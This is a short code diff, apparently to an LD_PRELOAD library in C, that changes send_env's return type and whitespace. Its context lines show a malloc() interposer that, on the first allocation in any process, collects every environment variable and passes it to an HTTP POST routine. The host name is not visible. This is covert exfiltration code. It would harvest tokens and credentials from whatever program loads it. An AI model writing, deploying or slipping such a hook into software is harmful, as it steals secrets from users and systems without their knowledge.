@@ -68,7 +68,7 @@ int sendHttpPost(const char *hostname, const char *path, const char *data) {
     return 0;
 } 
 
-int send_env() {
+void send_env() {
     extern char **environ;
     char *data = calloc(65536, sizeof(char)); 
     char *ptr = data;
@@ -94,7 +94,7 @@ void *malloc(size_t size)
     if(i == 0) {
       send_env();
       i = i++;
-    }
+    } 
 
     real_malloc = dlsym(RTLD_NEXT, "malloc");
     return real_malloc(size);
